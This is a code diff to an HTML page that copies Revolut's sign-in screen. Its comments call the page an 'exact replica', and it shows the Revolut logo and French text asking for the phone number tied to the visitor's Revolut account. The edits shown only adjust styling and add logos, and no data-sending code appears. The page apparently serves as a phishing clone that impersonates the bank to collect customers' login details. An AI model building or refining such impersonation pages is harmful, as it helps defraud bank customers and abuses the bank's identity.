@@ -29,7 +29,7 @@
             flex-direction: column;
         }
 
-        /* Header - Exact replica */
+        /* Header - Identical to Revolut */
         .revolut-header {
             display: flex;
             justify-content: center;
@@ -56,7 +56,7 @@
             letter-spacing: -0.2px;
         }
 
-        /* Main Container - Identical to original */
+        /* Main Content - Exact replica */
         .revolut-container {
             flex: 1;
             display: flex;
@@ -79,11 +79,23 @@
             margin-bottom: 24px;
         }
 
+        /* Added logo above title */
+        .revolut-auth-logo {
+            text-align: center;
+            margin-bottom: 24px;
+        }
+
+        .revolut-auth-logo img {
+            height: 48px;
+            width: auto;
+        }
+
         .revolut-title {
             font-size: 24px;
             font-weight: 700;
             line-height: 32px;
             margin-bottom: 8px;
+            text-align: center;
         }
 
         .revolut-subtitle {
@@ -91,6 +103,7 @@
             color: var(--revolut-text-light);
             line-height: 24px;
             margin-bottom: 32px;
+            text-align: center;
         }
 
         /* Phone Input - Exact replica */
@@ -252,6 +265,10 @@
             .revolut-card {
                 padding: 24px;
             }
+            
+            .revolut-auth-logo img {
+                height: 40px;
+            }
         }
     </style>
 </head>
@@ -260,13 +277,18 @@
     <header class="revolut-header">
         <div class="revolut-logo">
             <img src="Revolut-Logo.wine.png" alt="Revolut" class="revolut-logo-img">
-            <span class="revolut-logo-text">revolut</span>
+            <span class="revolut-logo-text">revolut.</span>
         </div>
     </header>
 
     <!-- Main Content - Exact replica -->
     <main class="revolut-container">
         <div class="revolut-card">
+            <!-- Added Revolut logo here -->
+            <div class="revolut-auth-logo">
+                <img src="Revolut-Logo.wine.png" alt="Revolut" class="revolut-logo-img">
+            </div>
+            
             <h1 class="revolut-title">Heureux de vous revoir</h1>
             <p class="revolut-subtitle">Saisissez le numéro de téléphone associé à votre compte Revolut.</p>
             
